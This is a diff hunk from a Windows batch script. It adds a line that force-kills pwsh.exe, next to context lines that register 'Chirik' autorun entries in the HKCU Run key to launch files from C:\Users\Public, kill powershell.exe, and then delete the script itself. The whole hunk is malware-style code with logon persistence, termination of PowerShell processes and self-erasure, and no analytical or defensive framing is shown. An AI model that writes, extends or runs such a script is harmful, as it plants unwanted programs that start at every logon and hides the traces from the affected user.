@@ -11,4 +11,5 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Chirik2" /t REG
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Chirik3" /t REG_SZ /d "cmd.exe /c start \"\" \"C:\Users\Public\chirik3.txt\"" /f
 
 taskkill /f /im powershell.exe >nul 2>&1
+taskkill /f /im pwsh.exe >nul 2>&1
 (goto) 2>nul & del "%~f0"
